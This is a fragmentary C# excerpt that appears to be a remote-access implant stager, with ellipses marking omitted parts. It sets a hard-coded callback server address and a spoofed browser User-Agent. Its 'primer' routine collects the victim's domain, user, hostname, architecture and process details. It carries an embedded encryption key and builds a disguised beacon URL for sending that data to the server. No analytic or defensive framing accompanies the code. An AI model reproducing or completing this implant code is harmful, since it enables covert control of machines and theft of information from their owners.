...
public class Program
{
	...
	private static string[] dfarray = {""};
	public static string[] dfhead = null;
	private static string[] basearray = {"https://10.0.2.15:443"};
	...
	static System.Net.WebClient GetWebRequest(string cookie)
	{
		...
		x.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36");
		x.Headers.Add("Referer", "");
	...
	static void primer()
	{
		if (DateTime.ParseExact("2999-12-01", "yyyy-MM-dd", CultureInfo.InvariantCulture) > DateTime.Now)
		{
			...
			{
				var o = String.Format("{0};{1};{2};{3};{4};{5};1", dn, u, cn, arch, pid, procname);
				string key = @"TEkD1gsJQyrIy5stMI8G4qZQzlSrCrFvv36aHCFuwqQ=";
				baseURL = du;
				string s = baseURL+"/vssf/wppo/site/bgroup/visitor/?c";
				try {
